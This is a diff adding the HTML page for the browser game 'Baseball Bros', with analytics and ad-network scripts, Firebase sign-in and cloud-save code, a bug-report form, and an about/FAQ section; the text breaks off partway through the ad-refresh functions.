@@ -1,0 +1,1100 @@
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-L7856P3VNT"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-L7856P3VNT');
+</script>	<html lang="en">
+    <base href="https://cdn.jsdelivr.net/gh/bubbls/UGS-Assets@ae6706e5224c55594c491edfc7f5ad541e2ea02b/baseball%20bros/" </base>
+	<head>
+
+	  <meta charset="utf-8">
+
+	  <title>BASEBALL BROS! | Official Site</title>
+	  <meta name="description" content="Online multiplayer baseball! Strikeouts, steals, and grand slams! Hit Nukes!" />
+	  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+	  <link rel="shortcut icon" type="image/png" href="./favicon.png">
+	  <meta name="Keywords" content="Baseball, Play, Free, Online, Multiplayer, Games, IO, Sports, Scrolling, Friends">
+	  <meta name="author" content="Blue Wizard Digital">
+
+	  <meta property="og:type" content="website" />
+	  <meta property="og:title" content="Baseball Bros" />
+	  <meta property="og:description" content="Online multiplayer baseball! Hit home runs, steal bases, strike out the side!" />
+	  <link rel="manifest" href="manifest.json">
+
+
+	  <script type="text/javascript" src="./BaseballBros.js?th=76"></script>
+
+	  <script>
+	    window.addEventListener("touchmove", function(event) {
+	      event.preventDefault();
+	    }, {
+	      capture: false,
+	      passive: false
+	    });
+	    if (typeof window.devicePixelRatio != 'undefined' && window.devicePixelRatio > 2) {
+	      var meta = document.getElementById("viewport");
+	      meta.setAttribute('content', 'width=device-width, initial-scale=' + (2 / window.devicePixelRatio) + ', user-scalable=no');
+	    }
+	    window.addEventListener('keydown', function(e) {
+	      if ((e.keyCode == 32 || e.keyCode == 38 || e.keyCode == 40 || e.keyCode == 9) && e.target == document.body) {
+	        e.preventDefault();
+	      }
+	    });
+	    var aCo = 'US';
+	  </script>
+
+	  <style>
+	    html,
+	    body {
+	      margin: 0;
+	      padding: 0;
+	      height: 100%;
+	      background: #000000;
+	      color: orange;
+	      height: 100%;
+	      width: 100%;
+	      height: 100vh;
+	      width: 100vw;
+	      margin: 0;
+	      padding: 0;
+	    }
+
+	    .body::-webkit-scrollbar {
+	      /* WebKit */
+	      width: 0px;
+	    }
+
+	    #openfl-content {
+	      background: #000000;
+	      width: 100%;
+	      height: 100%;
+	    }
+
+	    #spinner {
+	      -webkit-transform-origin: 50% 50%;
+	      -moz-transform-origin: 50% 50%;
+	      -o-transform-origin: 50% 50%;
+	      transform-origin: 50% 50%;
+	      width: 82px;
+	      height: 81px;
+	      -webkit-animation: spin1 2s infinite linear;
+	      -moz-animation: spin1 2s infinite linear;
+	      -o-animation: spin1 2s infinite linear;
+	      -ms-animation: spin1 2s infinite linear;
+	      animation: spin1 2s infinite linear;
+	    }
+
+
+
+
+	    /* Main content styling */
+	    #more {
+	      display: flex;
+	      justify-content: space-between;
+	      background-color: #1a1a1a;
+	      padding: 40px;
+	      border-top: 0px solid #444;
+	      color: #fff;
+	      font-family: 'Arial', sans-serif;
+	    }
+
+	    .info-box {
+	      width: 48%;
+	      background-color: #222;
+	      padding: 20px;
+	      border-radius: 8px;
+	      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.4);
+	    }
+
+	    h3 {
+	      font-size: 24px;
+	      color: #ffa500;
+	      /* Baseball-themed color */
+	      margin-bottom: 15px;
+	    }
+
+	    p,
+	    b {
+	      line-height: 1.6;
+	      font-size: 16px;
+	    }
+
+	    p {
+	      margin-bottom: 10px;
+	    }
+
+	    b {
+	      color: #ffd700;
+	      /* Highlighted question color */
+	    }
+
+
+	    /* unvisited link */
+	    a:link {
+	      color: #ffd700;
+	    }
+
+	    /* visited link */
+	    a:visited {
+	      color: #ffd700;
+	    }
+
+	    /* mouse over link */
+	    a:hover {
+	      color: #ffd700;
+	    }
+
+	    /* selected link */
+	    a:active {
+	      color: #ffd700;
+	    }
+
+	    .notch-top-left {
+	      width: 20px;
+	      height: 20px;
+	      background-color: var(--background-color, #1a1a1a);
+	      position: absolute;
+	      top: -10px;
+	      left: -10px;
+	      clip-path: polygon(100% 0, 0 100%, 100% 100%);
+	    }
+
+	    /* Footer styling */
+	    footer {
+	      background-color: #000;
+	      padding: 20px 0;
+	      text-align: center;
+	      color: #ccc;
+	      font-size: 14px;
+	      border-top: 2px solid #444;
+	      margin-top: 40px;
+	      font-family: 'Arial', sans-serif;
+	      border: 0;
+	    }
+
+	    .feedback-form {
+	      position: absolute;
+	      top: 50%;
+	      left: 50%;
+	      transform: translate(-50%, -50%);
+	      width: 50vw;
+	      height: 50vh;
+	      background-color: #2A6DB0;
+	      padding: 20px;
+	      border: 4px solid #FF0000;
+	      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+	      text-align: center;
+	      color: #FFFFFF;
+	    }
+
+	    .feedback-form h3 {
+	      font-size: 24px;
+	      margin-bottom: 20px;
+	      color: #FFFFFF;
+	      text-shadow: 2px 2px #000000;
+	    }
+
+	    .feedback-form textarea {
+	      width: calc(100% - 20px);
+	      height: 50%;
+	      margin-bottom: 10px;
+	      padding: 10px;
+	      font-size: 16px;
+	      font-family: 'Courier New', Courier, monospace;
+	      border: 3px solid #000000;
+	      background-color: #000000;
+	      /* Black background */
+	      color: #FFFFFF;
+	      /* White text */
+	      resize: none;
+	      box-sizing: border-box;
+	    }
+
+	    .feedback-form button {
+	      width: 100%;
+	      padding: 12px;
+	      background-color: #FFD700;
+	      /* Yellowish background */
+	      color: #000000;
+	      border: 3px solid #FF0000;
+	      border-radius: 0;
+	      font-size: 18px;
+	      cursor: pointer;
+	      font-family: 'Courier New', Courier, monospace;
+	      text-shadow: 1px 1px #000000;
+	    }
+
+	    .feedback-form button:hover {
+	      background-color: #FFB800;
+	      /* Slightly darker yellow on hover */
+	      color: #FFFFFF;
+	    }
+	  
+</style>
+
+	  	  <script async src="https://www.googletagmanager.com/gtag/js?id=G-D67EBFNGR6"></script>
+
+	  <script>
+	    window.dataLayer = window.dataLayer || [];
+
+	    function gtag() {
+	      dataLayer.push(arguments);
+	    }
+	    gtag('js', new Date());
+
+	    if (location.hostname != "localhost") gtag('config', 'G-D67EBFNGR6', {
+	      cookie_flags: 'secure;samesite=none'
+	    });
+	  </script>
+
+	  <script>
+	    //Interstitial ad available event
+	    document.addEventListener("aip_interstitialadavailable", function(e) {
+	      console.log("An interstitial ad is available");
+	    });
+	  </script>
+	  <script>
+	    console.log("Initting AIP")
+	    window.aiptag = window.aiptag || {
+	      cmd: []
+	    };
+	    aiptag.cmd.display = aiptag.cmd.display || [];
+	    aiptag.cmd.player = aiptag.cmd.player || [];
+
+	    //CMP tool settings
+	    aiptag.consented = false; // GDPR setting, please set this value to false if an EU user has declined or not yet accepted marketing cookies, for users outside the EU please use true and for users accepted the GDPR also use true
+	    aiptag.cmp = {
+	      show: true,
+	      position: "centered",
+	      button: false,
+	      buttonText: "Privacy settings",
+	      buttonPosition: "bottom-left"
+	    }
+	  </script>
+	  <script async src="tag.min.js"></script>
+
+	  <script>
+	    function SetupMSNotification() {
+	      console.log("notifying");
+	      if (typeof $msstart !== 'undefined') {
+	        console.log("notifying2");
+	        var id = btoa("https://baseballbros.io/sbros_364x180.png");
+	        $msstart.scheduleNotificationAsync({
+	          title: 'Unlock new bros now!',
+	          description: 'You are just about to unlock a new Bro! Who will it be?',
+	          type: 1,
+	          minDelayInSeconds: 24 * 60 * 60
+	        }).then(response => {
+	          console.log("notification response: " + response);
+	        });
+	        $msstart.scheduleNotificationAsync({
+	          title: 'Dunk all over your bros!',
+	          description: 'New bros just waiting to be dunked on! Unlock them now!',
+	          type: 1,
+	          minDelayInSeconds: 24 * 7 * 60 * 60
+	        }).then(response => {
+	          console.log("notification response: " + response);
+	        });
+
+	      }
+	    }
+
+	    var msAdID;
+
+	    function LoadVideo() {
+	      if (typeof $msstart !== 'undefined') {
+	        $msstart.loadAdsAsync().then(adInstance => {
+	          // Use the adInstance.instanceId to make a call to showAdsAsync
+	          msAdID = adInstance.instanceId;
+	        });
+
+	        SetupMSNotification();
+	      }
+	    }
+
+	    function ShowVideo(theUnitName = null) {
+	      Main.DoneVideoAd(true);
+	      return; //! when aip is live, remove this
+
+	      console.log('SHOW_VIDEO:' + theUnitName);
+	      var aUnitName = "";
+	      if (typeof $msstart !== 'undefined') {
+	        $msstart.showAdsAsync(msAdID).then(adInstance => {
+	          // Use the adInstance.showAdsCompletedAsync to be notified of the completion of showing the advertisement
+	          adInstance.showAdsCompletedAsync.then((val) => {
+	            console.log('MS Video Ad Complete');
+	            Main.DoneVideoAd();
+	            window.focus();
+	            window.document.getElementById('openfl-content').focus();
+	            LoadVideo();
+	          }).catch((err) => {
+	            console.log('Ms Video Ad Error');
+	            Main.DoneVideoAd();
+	            window.focus();
+	            window.document.getElementById('openfl-content').focus();
+	            LoadVideo();
+	          });
+	        });
+	      } else if (typeof gCrazySDK !== 'undefined') {
+	        gCrazySDK.addEventListener("adFinished", Main.DoneVideoAd); // reenable sound, enable ui
+	        gCrazySDK.addEventListener("adError", Main.DoneVideoAd); // reenable sound, enable ui
+	        gCrazySDK.requestAd();
+	        console.log('CG_AD_REQUESTED');
+	        SendEvent('event', 'cgvideo');
+	        return;
+	      } else if (typeof adplayer === 'undefined') {
+	        Main.DoneVideoAd(true);
+	        SendEvent('event', 'video_adblocked');
+	        console.log('VIDEO_ADBLOCKED');
+
+	      } else {
+	        var aStr = 'preroll';
+	        //if(theUnitName != null) aStr = theUnitName;
+	        lastUnitPlayed = aStr;
+	        SendEvent('event', 'startvideo-' + aStr);
+
+	        aiptag.cmd.player.push(function() {
+	          adplayer.startVideoAd(theUnitName);
+	        });
+	      }
+	    }
+	  </script>
+
+	  <!-- Firebase App (the core Firebase SDK) -->
+	  <script src="firebase-app.js"></script>
+	  <!-- Firebase Authentication -->
+	  <script src="firebase-auth.js"></script>
+	  <!-- Firebase Firestore (Database) -->
+	  <script src="firebase-firestore.js"></script>
+
+	  <script>
+	    // Your web app's Firebase configuration
+	    const firebaseConfig = {
+	      apiKey: "AIzaSyBuzj8XEP7-5kOFFhyuxylQ6P0B2G_ogsM",
+	      authDomain: "baseball-bros-8dd7f.firebaseapp.com",
+	      projectId: "baseball-bros-8dd7f",
+	      storageBucket: "baseball-bros-8dd7f.firebasestorage.app",
+	      messagingSenderId: "618024516218",
+	      appId: "1:618024516218:web:11efff2d4b092aefaf99c3"
+	    };
+
+
+	    // Initialize Firebase
+	    firebase.initializeApp(firebaseConfig);
+	    const auth = firebase.auth();
+	    const db = firebase.firestore();
+	    var userData = "";
+
+	    function triggerSignIn() {
+	      var provider = new firebase.auth.GoogleAuthProvider();
+	      auth.signInWithPopup(provider);
+	    }
+
+	    // Save game data function
+	    function saveGameData(gameData) {
+	      console.log('saving gamedata:' + gameData);
+	      var userId = auth.currentUser.uid;
+	      userData = gameData;
+	      db.collection('users').doc(userId).set({
+	        gameData: gameData
+	      }).then(function() {
+	        console.log('Game data saved');
+	      }).catch(function(error) {
+	        console.error('Error saving game data:', error);
+	      });
+	    }
+
+	    // Load game data function
+	    function loadGameData() {
+	      return userData;
+	    }
+
+	    function loadGameDataAsync() {
+	      var userId = auth.currentUser.uid;
+	      db.collection('users').doc(userId).get().then(function(doc) {
+	        if (doc.exists) {
+	          userData = doc.data().gameData;
+	          //Main.LoadGlobals();
+	          console.log('Game data:', doc.data().gameData);
+	          if (typeof Main != "undefined") {
+	            Main.LoadDataComplete();
+	          }
+	          // Use the game data in your game
+	        } else {
+	          console.log('No such document!');
+	        }
+	      }).catch(function(error) {
+	        console.error('Error loading game data:', error);
+	      });
+	    }
+
+	    // Firebase auth state observer
+	    auth.onAuthStateChanged(function(user) {
+	      if (user) {
+	        loadGameDataAsync();
+	        SendEvent('event', 'sign_in');
+	        console.log('user signed in');
+	      } else {
+	        console.log('No user signed in');
+	        SendEvent('event', 'sign_out');
+	      }
+	    });
+
+	    function signOut() {
+	      auth.signOut().then(() => {
+	        Main.SignOutComplete();
+	        console.log('signed out');
+	      });
+	    }
+
+	    function isUserLoggedIn() {
+	      return auth.currentUser !== null;
+	    }
+	  </script>
+
+	</head>
+
+	<body style="overflow:hidden;">
+	  <noscript>Enable JavaScript bro!</noscript>
+	  <script>
+	    //alert("Globals:"+localStorage.getItem("/:Globals").length);
+	    /////////////////////////////////////////////////////////////////////
+	    ////////////////////////////////////////////////////////////////////
+	    var url = window.location.href;
+	    if (url.includes("www.")) {
+	      url = url.replace("www.", "");
+
+	      var f = document.createElement('form');
+	      f.action = url;
+	      f.method = 'POST';
+	      var i = document.createElement('input');
+	      i.type = 'hidden';
+	      i.name = 'FGlobals';
+	      i.value = localStorage.getItem("/:Globals");
+	      f.appendChild(i);
+
+	      document.body.appendChild(f);
+	      f.submit();
+	    } else {
+	      var aPost = "";
+	      var aStorage = localStorage.getItem("/:Globals");
+	      var aLen = 0;
+	      if (aStorage != null && aStorage.length > 0) {
+	        aLen = aStorage.length;
+	      }
+	      if (aPost.length > aLen) localStorage.setItem("/:Globals", aPost);
+	      if (aPost.length > 0 && aPost.length == aLen) localStorage.setItem("/:Globals", aPost);
+	    }
+	    /////////////////////////////////////////////////////////////////////
+	    ////////////////////////////////////////////////////////////////////
+	  </script>
+
+	  <div id="loading" style="position: absolute; z-index: 15; top: 60%; left: 50%; transform: translate(-50%, 0); background: black;">
+	    <center><img src="assets/loading4.png"><br />
+	      <img src="assets/fbro.png">
+	      <img src="assets/bbbro.png">
+	      <img src="assets/sbro.png">
+	      <img src="assets/wbro.png">
+	      <img src="assets/kbro.png">
+	      <img src="assets/bbro.png">
+	    </center>
+	  </div>
+
+	  <div id="game2" style="width: 100%; height: 100%; ">
+	    <div id="openfl-content" onblur="window.focus(); window.scrollTo(0, 0);" style="width: calc(100%); float:left;">
+	      <script type="text/javascript">
+	        lime.embed("BaseballBros", "openfl-content", 0, 0, {
+	          parameters: {}
+	        });
+	      </script>
+	    </div>
+	    <div id="preroll" style="width: 960px; height: 540px; display: none; position: absolute; top: 50%; left: 50%; z-index: 100; transform: translate(-50%, -50%);">
+	    </div>
+
+	    <div id="baseballbros-io_300x250" style="width: 336px; height: 280px; visibility:hidden; display: none; position: absolute; top: 30px; left: 30px; z-index: 100;overflow: hidden;">
+	      <script>
+	        if (typeof gCrazySDK == 'undefined') {
+	          aiptag.cmd.display.push(function() {
+	            aipDisplayTag.display('baseballbros-io_300x250');
+	          });
+	        }
+	      </script>
+	    </div>
+	    <div id="baseballbros-io_300x250_2" style="width: 336px; height: 280px; visibility:hidden; display: none; position: absolute; top: 30px; left: 30px; z-index: 100;overflow: hidden;">
+	      <script>
+	        if (typeof gCrazySDK == 'undefined') {
+	          aiptag.cmd.display.push(function() {
+	            aipDisplayTag.display('baseballbros-io_300x250_2');
+	          });
+	        }
+	      </script>
+	    </div>
+	    <div id="baseballbros-io_336x280" style="visibility:hidden; width: 336px; height: 600px; display: none; position: absolute; left: 30px; z-index: 100;overflow: hidden;">
+	    </div>
+	    <div id="baseballbros-io_336x280_2" style="visibility:hidden; width: 336px; height: 600px; display: none; position: absolute; left: 30px; z-index: 100;overflow: hidden;">
+	    </div>
+	    <div id="baseballbros-io_728x90" style="visibility:hidden; width: 728px; height: 90px; display: none; position: absolute; top: 30px; left: 30px; z-index: 100;overflow: hidden;">
+	    </div>
+	    <div id="baseballbros-io_728x90_m" style="visibility:hidden; width: 728px; height: 90px; display: none; position: absolute; top: 30px; left: 30px; z-index: 100;overflow: hidden;">
+	    </div>
+	    <div id="baseballbros-io_970x250" style="visibility:hidden; width: 970px; height: 250px; display: none; position: absolute; top: 30px; left: 30px; z-index: 100; text-align: center;overflow: hidden;">
+	    </div>
+
+	    <div class="feedback-form" id="feedbackForm" style="display:none;">
+	      <h3>Report a Bug/Glitch</h3>
+	      <textarea id="feedback" placeholder="Describe the bug or glitch with a lot of details, like how to make the glitch happen and anything else whether it seems useful or not..."></textarea>
+	      <textarea id="email" placeholder="Email address (optional)" style="height: 50px;"></textarea>
+	      <textarea id="discord" placeholder="Discord ID (optional)" style="height: 50px;"></textarea>
+	      <button onclick="sendFeedback()" id="submitBtn">Submit Feedback</button>
+	      <br />
+	      <br />
+	      <button onclick="document.getElementById('feedbackForm').style.display='none'" id="submitBtn">Cancel</button>
+	      <p id="responseMsg"></p>
+	    </div>
+	    <script>
+	      //                                                                                                                          var doFeedback = true;
+	      function getOSFromUserAgent() {
+	        const userAgent = navigator.userAgent;
+	        const platform = navigator.platform;
+
+	        // Check for common platforms and OS
+	        if (/Windows NT/i.test(userAgent)) return 'Windows';
+	        if (/Mac OS X/i.test(userAgent)) return 'macOS';
+	        if (/Linux/i.test(userAgent)) return 'Linux';
+	        if (/Android/i.test(userAgent)) return 'Android';
+	        if (/iPhone|iPad|iPod/i.test(userAgent)) return 'iOS';
+	        if (/CrOS/i.test(userAgent)) return 'Chrome OS';
+
+	        // Default to the platform if no match
+	        return platform || 'Unknown';
+	      }
+	      async function sendFeedback() {
+	        var feedback = '*' + document.getElementById("feedback").value.trim() + '*';
+	        var email = document.getElementById("email").value.trim();
+	        var discord = document.getElementById("discord").value.trim();
+	        const screenResolution = `${window.screen.width}x${window.screen.height}`;
+	        const windowResolution = `${window.innerWidth}x${window.innerHeight}`;
+	        var aOS = getOSFromUserAgent();
+	        var aCity = 'Unknown';
+	        const hostname = window.location.hostname;
+	        const gpu = (() => {
+	          const canvas = document.createElement('canvas');
+	          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+	          const debugInfo = gl?.getExtension('WEBGL_debug_renderer_info');
+	          const gpuInfo = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown';
+
+	          // Cleanup
+	          canvas.remove(); // Remove the canvas from the DOM (if it was added)
+	          return gpuInfo;
+	        })();
+
+	        feedback = feedback + '\nDomain: ' + hostname;
+	        feedback = feedback + ', OS: ' + aOS;
+	        feedback = feedback + ', Screen res: ' + screenResolution;
+	        feedback = feedback + ', Window res: ' + windowResolution;
+	        feedback = feedback + ', GPU: ' + gpu;
+	        feedback = feedback + ', City: ' + aCity;
+	        feedback = feedback + ', Email: ' + email;
+	        feedback = feedback + ', Discord: ' + discord;
+
+	        const responseMsg = document.getElementById("responseMsg");
+	        const submitBtn = document.getElementById("submitBtn");
+
+	        if (!feedback) {
+	          alert("Please enter feedback.");
+	          return;
+	        }
+
+	        submitBtn.disabled = true;
+	        responseMsg.textContent = "Submitting...";
+
+	        try {
+	          const response = await fetch("sendFeedback.php", {
+	            method: "POST",
+	            headers: {
+	              "Content-Type": "application/x-www-form-urlencoded"
+	            },
+	            body: new URLSearchParams({
+	              feedback: feedback
+	            })
+	          });
+
+	          const result = await response.json();
+
+	          if (result.status === "success") {
+	            document.getElementById("feedbackForm").style.display = "none"; // Close the feedback form
+	            alert(result.message); // Show success message
+	          } else {
+	            document.getElementById("feedbackForm").style.display = "none"; // Close the feedback form
+	            alert(result.message); // Show error message
+	          }
+	        } catch (error) {
+	          document.getElementById("feedbackForm").style.display = "none"; // Close the feedback form
+	          alert("Error submitting feedback. Please try again.");
+	        }
+
+	        submitBtn.disabled = false;
+	      }
+	    </script>
+
+
+
+	  </div>
+	  <br />
+	  <div tabindex="-1" id="more">
+	    <div class="info-box">
+	      <h3>About Baseball Bros</h3>
+	      <p>Baseball Bros is a simple, fast-paced baseball game that's easy to learn and has lots of crazy hijinks! With online multiplayer gameplay, franchise mode, fun pitching, and so much more!</p>
+	      <p>Controls: Use either the arrow keys or WASD to control your bro. Space bar will throw a the ball, dive, slide, or change directions when you're running the bases.</p>
+	      <p>Be sure to follow us on social media for the latest updates and info!</p>
+	      <br />
+	      <h3>Changelog (3/13/2024)</h3>
+	      <p>Fixed another glitch where the game ends to early if the home team scores on their last at bat while still losing.</p>
+	      <p>Made cpu players better at catching fly balls. Should make it more difficult in 1p games.</p>
+	      <p>Updated theme song.</p>
+	      <p>Fixed more innings glitches.</p>
+	      <p>Fixed glitch where home team wouldn't get their fair at bat in extra innings.</p>
+	      <p>Improved virtual controller on iPads and pnones.</p>
+	    </div>
+	    <div class="info-box">
+	      <h3>FAQ</h3>
+	      <b>Why isn't the game loading?</b>
+	      <p>You should check your internet connection and make sure our site isn't blocked. Also, disable all ad blockers.</p>
+	      <b>How do I play?</b>
+	      <p>Use your arrow keys and space bar! The rest is easy- pick your play and go!</p>
+	      <b>Which browser should I use?</b>
+	      <p>You should use Chrome. It is the only browser guaranteed to work. Baseball Bros has also been tested to work on Firefox and Safari, but not guaranteed.</p>
+	      <b>Are there more Bros games?</b>
+	      <p>Yes! Check out <a tabindex="-1" href="https://footballbros.io">Football Bros</a>, href="https://basketbros.io">Basket Bros</a>, <a tabindex="-1" href="https://soccerbros.gg">Soccer Bros</a> and <a tabindex="-1" href="https://wrestlebros.io">Wrestle Bros</a>. Also be sure to check out <a tabindex="-1" href="https://freegames.io" target="_blank">Web games at FreeGames.io</a></p>
+	      <b>Do you have a favorite team?</b>
+	      <p>Yes, but we're not saying which one. Drop us an e-mail if you think you know.</p>
+	      <b>I'm blocked, where else can i play?</b>
+	      <p>Check here, these links work for all the bros games: <a href="https://sites.google.com/bluewizard.com/basket-bros-unblocked">Baseball Bros Unblocked</a></p>
+
+	    </div>
+	  </div>
+	  <footer id="footer" tabindex="-1">
+	    <div tabindex="-1" class="footer-links">
+	      <a tabindex="-1" href="https://bluewizard.com">Copyright 2024 Blue Wizard Digital</a> |
+	      <a tabindex="-1" href="https://bluewizard.com/terms/">Terms of Service</a> |
+	      <a tabindex="-1" href="https://bluewizard.com/privacypolicy/">Privacy Policy</a>
+	    </div>
+	  </footer>
+	  <script>
+	    var lastRefresh = 0;
+
+	    function refreshTag(theTag) {
+	      try {
+	        aiptag.cmd.display.push(function() {
+	          aipDisplayTag.refresh(theTag);
+	        });
+	        console.log('Tag refreshed successfully');
+	      } catch (error) {
+	        console.error('Error refreshing the tag:', error);
+	      }
+	    }
+
+
+	    function ShowAd1(doRefresh) {
+	      if (/Android|webOS|iPhone|iPad|iPod|Opera Mini/i.test(navigator.userAgent)) {
+	        return;
+	      }
+	      var l = window.document.getElementById('baseballbros-io_160x600');
+	      if (l == null) return;
+	      l.style.display = '';
+	      l.style.visibility = 'visible';
+
+	      l = window.document.getElementById('baseballbros-io_160x600');
+	      if (l == null) return;
+	      l.style.display = '';
+	      l.style.visibility = 'visible';
+
+
+	      if (typeof gCrazySDK !== 'undefined') {
+	        var d = new Date();
+	        var ms = d.getTime();
+	        if (ms - lastRefresh > 10000) {
+	          gCrazySDK.requestResponsiveBanner(["baseballbros-io_160x600"]);
+	          lastRefresh = ms;
+	        }
+	      } else if (typeof aipDisplayTag !== 'undefined') {
+	        refreshTag('baseballbros-io_160x600');
+	        refreshTag('baseballbros-io_160x600_2');
+	        SendEvent('event', 'aip_banner_requested');
+	      } else
+	        SendEvent('event', 'banner_adblocked');
+
+	    }
+
+	    var lastRefresh6 = 0;
+	    var doTagOnce = true;
+
+	    function ShowAd6() {
+	      var d = new Date();
+	      var ms = d.getTime();
+	      if (ms - lastRefresh6 < 10000) {
+	        return;
+	      }
+	      lastRefresh6 = ms;
+
+
+	      if (/Android|webOS|iPhone|iPad|iPod|Opera Mini/i.test(navigator.userAgent)) {
+	        return;
+	      }
+	      var l = window.document.getElementById('baseballbros-io_300x250');
+	      if (l == null) {
+	        return;
+	      }
+	      l.style.display = '';
+	      l.style.visibility = 'visible';
+
+	      if (typeof gCrazySDK !== 'undefined') {} else if (typeof aipDisplayTag !== 'undefined') {
+	        refreshTag('baseballbros-io_300x250');
+	        SendEvent('event', 'aip_banner_requested');
+	        if (typeof aiptag !== 'undefined' && aiptag.settings == "") {
+	          if (doTagOnce) SendEvent('event', 'aip_prosper');
+	          SendEvent('event', 'request_prosper');
+	        } else if (typeof aiptag !== 'undefined' && aiptag.settings.iProsperTest !== "undefined") {
+	          if (doTagOnce) SendEvent('event', 'aip_legacy');
+	          SendEvent('event', 'request_legacy');
+	        }
+	        doTagOnce = false;
+	      } else
+	        SendEvent('event', 'banner_adblocked');
+	    }
+
+	    var lastRefresh2 = 0;
+
+	    function ShowAd2() {
+
+	      var d = new Date();
+	      var ms = d.getTime();
+	      if (ms - lastRefresh2 < 10000) {
+	        return;
+	      }
+	      lastRefresh2 = ms;
+
+
+	      if (/Android|webOS|iPhone|iPad|iPod|Opera Mini/i.test(navigator.userAgent)) {
+	        return;
+	      }
+	      var l = window.document.getElementById('baseballbros-io_300x250_2');
+	      if (l == null) return;
+	      l.style.display = '';
+	      l.style.visibility = 'visible';
+
+	      if (typeof gCrazySDK !== 'undefined') {
+	        var d = new Date();
+	        var ms = d.getTime();
+	        if (ms - lastRefresh2 > 10000) {
+	          //hndled by the first banner request
+	          //gCrazySDK.requestBanner([{containerId: 'baseballbros-io_300x250_2',size: '300x250',}]);
+	          gCrazySDK.requestResponsiveBanner(["baseballbros-io_300x250", "baseballbros-io_300x250_2"]);
+
+	          lastRefresh2 = ms;
+	        }
+	      } else if (typeof aipDisplayTag !== 'undefined') {
+	        refreshTag('baseballbros-io_300x250_2');
+	        SendEvent('event', 'aip_banner_requested');
+	        if (typeof aiptag !== 'undefined' && aiptag.settings == "") {
+	          if (doTagOnce) SendEvent('event', 'aip_prosper');
+	          SendEvent('event', 'request_prosper');
+	        } else if (typeof aiptag !== 'undefined' && aiptag.settings.iProsperTest !== "undefined") {
+	          if (doTagOnce) SendEvent('event', 'aip_legacy');
+	          SendEvent('event', 'request_legacy');
+	        }
+	      } else
+	        SendEvent('event', 'banner_adblocked');
+	    }
+
+	    function ShowAd3() {
+	      if (/Android|webOS|iPhone|iPad|iPod|Opera Mini/i.test(navigator.userAgent)) {
+	        return;
+	      }
+	      var l = window.document.getElementById('baseballbros-io_728x90');
+	      if (l == null) return;
+	      l.style.display = '';
+	      l.style.visibility = 'visible';
+	      if (typeof gCrazySDK !== 'undefined') {
+	        gCrazySDK.requestResponsiveBanner(["baseballbros-io_728x90"]);
+	      } else if (typeof aipDisplayTag !== 'undefined') {
+	        refreshTag('baseballbros-io_728x90');
+	        SendEvent('event', 'aip_banner_requested');
+	      } else
+	        SendEvent('event', 'banner_adblocked');
+
+	    }
+
+	    function ShowAd4() {
+	      if (/Android|webOS|iPhone|iPad|iPod|Opera Mini/i.test(navigator.userAgent)) {
+	        return;
+	      }
+	      if (window.innerWidth < 1200) return;
+	      var l = window.document.getElementById('baseballbros-io_336x280');
+	      if (l == null) return;
+	      l.style.display = '';
+	      l.style.visibility = 'visible';
+	      if (typeof gCrazySDK !== 'undefined') {
+	        gCrazySDK.requestResponsiveBanner(["baseballbros-io_336x280"]);
+	      } else if (typeof aipDisplayTag !== 'undefined') {
+	        refreshTag('baseballbros-io_336x280');
+	        SendEvent('event', 'aip_banner_requested');
+	        if (typeof aiptag !== 'undefined' && aiptag.settings == "") {
+	          if (doTagOnce) SendEvent('event', 'aip_prosper');
+	          SendEvent('event', 'request_prosper');
+	        } else if (typeof aiptag !== 'undefined' && aiptag.settings.iProsperTest !== "undefined") {
+	          if (doTagOnce) SendEvent('event', 'aip_legacy');
+	          SendEvent('event', 'request_legacy');
+	        }
+	      } else
+	        SendEvent('event', 'banner_adblocked');
+
+	    }
+
+	    function ShowAd7() {
+	      if (/Android|webOS|iPhone|iPad|iPod|Opera Mini/i.test(navigator.userAgent)) {
+	        return;
+	      }
+	      if (window.innerWidth < 1200) return;
+	      var l = window.document.getElementById('baseballbros-io_336x280_2');
+	      if (l == null) return;
+	      l.style.display = '';
+	      l.style.visibility = 'visible';
+	      if (typeof gCrazySDK !== 'undefined') {
+	        gCrazySDK.requestResponsiveBanner(["baseballbros-io_336x280_2"]);
+	      } else if (typeof aipDisplayTag !== 'undefined') {
+	        refreshTag('baseballbros-io_336x280_2');
+	        SendEvent('event', 'aip_banner_requested');
+	        if (typeof aiptag !== 'undefined' && aiptag.settings == "") {
+	          if (doTagOnce) SendEvent('event', 'aip_prosper');
+	          SendEvent('event', 'request_prosper');
+	        } else if (typeof aiptag !== 'undefined' && aiptag.settings.iProsperTest !== "undefined") {
+	          if (doTagOnce) SendEvent('event', 'aip_legacy');
+	          SendEvent('event', 'request_legacy');
+	        }
+	      } else
+	        SendEvent('event', 'banner_adblocked');
+
+	    }
+
+	    function ShowAd8() {
+	      if (/Android|webOS|iPhone|iPad|iPod|Opera Mini/i.test(navigator.userAgent)) {
+	        return;
+	      }
+	      var l = window.document.getElementById('baseballbros-io_728x90_m');
+	      if (l == null) return;
+	      l.style.display = '';
+	      l.style.visibility = 'visible';
+	      if (typeof gCrazySDK !== 'undefined') {
+	        gCrazySDK.requestResponsiveBanner(["baseballbros-io_728x90"]);
+	      } else if (typeof aipDisplayTag !== 'undefined') {
+	        refreshTag('baseballbros-io_728x90_m');
+	        SendEvent('event', 'aip_banner_requested');
+	      } else
+	        SendEvent('event', 'banner_adblocked');
+
+	    }
+
+	    function ShowAd9() {
+	      if (/Android|webOS|iPhone|iPad|iPod|Opera Mini/i.test(navigator.userAgent)) {
+	        return;
+	      }
+	      var l = window.document.getElementById('baseballbros-io_970x250');
+	      if (l == null) return;
+	      l.style.display = '';
+	      l.style.visibility = 'visible';
+	      if (typeof gCrazySDK !== 'undefined') {
+	        gCrazySDK.requestResponsiveBanner(["baseballbros-io_970x250"]);
+	      } else if (typeof aipDisplayTag !== 'undefined') {
+	        refreshTag('baseballbros-io_970x250');
+	        SendEvent('event', 'aip_banner_requested');
+	        if (typeof aiptag !== 'undefined' && aiptag.settings == "") {
+	          if (doTagOnce) SendEvent('event', 'aip_prosper');
+	          SendEvent('event', 'request_prosper');
